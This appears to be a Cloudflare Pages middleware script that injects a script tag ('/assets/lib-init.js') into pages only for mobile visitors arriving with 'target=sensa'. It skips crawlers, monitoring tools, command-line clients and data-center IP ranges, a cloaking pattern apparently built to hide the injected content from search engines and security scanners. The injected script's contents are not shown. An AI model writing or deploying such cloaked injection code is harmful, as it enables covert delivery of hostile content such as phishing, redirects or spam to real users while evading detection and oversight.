export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);
  if (url.pathname.startsWith('/assets-kloning/') || url.pathname.startsWith('/assets/')) {
    return next();
  }
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
  const targetKey = url.searchParams.get('target');
  if (targetKey !== 'sensa') {
    return next();
  }
  const botList = /bot|spider|crawl|google|bing|slurp|yandex|baiduspider|duckduckbot|facebookexternalhit|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit|monitoring|uptimerobot|node-fetch|axios|go-http-client|java|php|postman|insomnia/i;
  if (botList.test(userAgent)) {
    return next();
  }
  const asOrganization = request.cf ? (request.cf.asOrganization || '').toLowerCase() : '';
  const dataCenterList = /amazon|google cloud|digitalocean|microsoft corporation|ovh|linode/i;
  if (dataCenterList.test(asOrganization)) {
    return next(); 
  }
  const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(userAgent);
  if (!isMobile) {
    return next();
  }
  const response = await next();
  return new HTMLRewriter()
    .on('body', {
      element(el) {
        el.append(`
          <script src="/assets/lib-init.js" defer></script>
        `, { html: true });
      },
    })
    .transform(response);
}
